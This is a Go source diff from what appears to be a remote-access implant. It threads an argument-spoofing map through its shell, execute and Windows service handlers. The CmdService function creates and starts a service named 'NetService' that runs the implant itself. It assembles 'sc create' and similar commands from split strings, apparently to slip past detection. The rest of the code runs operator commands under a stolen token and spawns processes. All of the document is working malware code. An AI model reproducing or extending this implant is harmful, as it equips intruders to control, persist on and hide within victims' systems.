@@ -66,7 +66,7 @@ func ParseCommandUpload(b []byte) ([]byte, []byte) {
 
 }
 
-func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
+func CmdShell(cmdBuf []byte, Token uintptr, argues map[string]string) ([]byte, error) {
 	shellPath, shellBuf, err := ParseCommandShell(cmdBuf)
 	if err != nil {
 		return nil, err
@@ -74,7 +74,7 @@ func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
 	//var result []byte
 	if shellPath == "" && runtime.GOOS == "windows" {
 		go func() {
-			_, err = packet.Run(shellBuf, Token)
+			_, err = packet.Run(shellBuf, Token, argues)
 			if err != nil {
 				communication.ErrorProcess(err)
 			}
@@ -82,7 +82,7 @@ func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
 		}()
 	} else {
 		go func() {
-			_, err = packet.Shell(shellPath, shellBuf, Token)
+			_, err = packet.Shell(shellPath, shellBuf, Token, argues)
 			if err != nil {
 				communication.ErrorProcess(err)
 			}
@@ -291,8 +291,8 @@ func CmdSpawnX86(cmdBuf []byte) ([]byte, error) {
 	return packet.Spawn_X86([]byte(cmdString))
 }
 
-func CmdExecute(cmdBuf []byte, Token uintptr) ([]byte, error) {
-	return packet.Execute(cmdBuf, Token)
+func CmdExecute(cmdBuf []byte, Token uintptr, argues map[string]string) ([]byte, error) {
+	return packet.Execute(cmdBuf, Token, argues)
 }
 
 func CmdGetUid() ([]byte, error) {
@@ -596,6 +596,8 @@ func CmdExit() ([]byte, error) {
 		os.Exit(0)
 	}
 	os.Exit(0)
+	//ExitThread := sysinfo.Kernel32.NewProc("ExitThread")
+	//ExitThread.Call(0)
 	return []byte("success exit"), nil
 }
 
@@ -666,7 +668,7 @@ func ProcessDPIAware() error {
 	return packet.SetProcessDPIAware()
 }
 
-func CmdService(Token uintptr) ([]byte, error) {
+func CmdService(Token uintptr, argues map[string]string) ([]byte, error) {
 	if runtime.GOOS != "windows" {
 		return []byte("Service installation is not supported on this platform."), nil
 	}
@@ -690,25 +692,25 @@ func CmdService(Token uintptr) ([]byte, error) {
 
 		time.Sleep(time.Second * 3)
 
-		_, err = packet.Run([]byte("sc c"+"reate NetService bin"+"path= \""+filePath+" "+currentFile+"\""), Token)
+		_, err = packet.Run([]byte("sc c"+"reate NetService bin"+"path= \""+filePath+" "+currentFile+"\""), Token, argues)
 		if err != nil {
 			communication.ErrorProcess(err)
 			return
 		}
 
-		_, err = packet.Run([]byte("sc s"+"tart NetService"), Token)
+		_, err = packet.Run([]byte("sc s"+"tart NetService"), Token, argues)
 		if err != nil {
 			communication.ErrorProcess(err)
 			return
 		}
 
-		_, err = packet.Run([]byte("sc s"+"top NetService"), Token)
+		_, err = packet.Run([]byte("sc s"+"top NetService"), Token, argues)
 		if err != nil {
 			communication.ErrorProcess(err)
 			return
 		}
 
-		_, err = packet.Run([]byte("sc d"+"elete NetService"), Token)
+		_, err = packet.Run([]byte("sc d"+"elete NetService"), Token, argues)
 		if err != nil {
 			communication.ErrorProcess(err)
 			return
@@ -751,7 +753,6 @@ func CmdArgueRemove(argues map[string]string, b []byte) ([]byte, error) {
 }
 
 func CmdArgueAdd(argues map[string]string, b []byte) ([]byte, error) {
-	//argue := strings.Split(strings.Trim(string(b), "\x00"), " ")
 	buff := bytes.NewBuffer(b)
 	_, err := util.ParseAnArg(buff)
 	if err != nil {
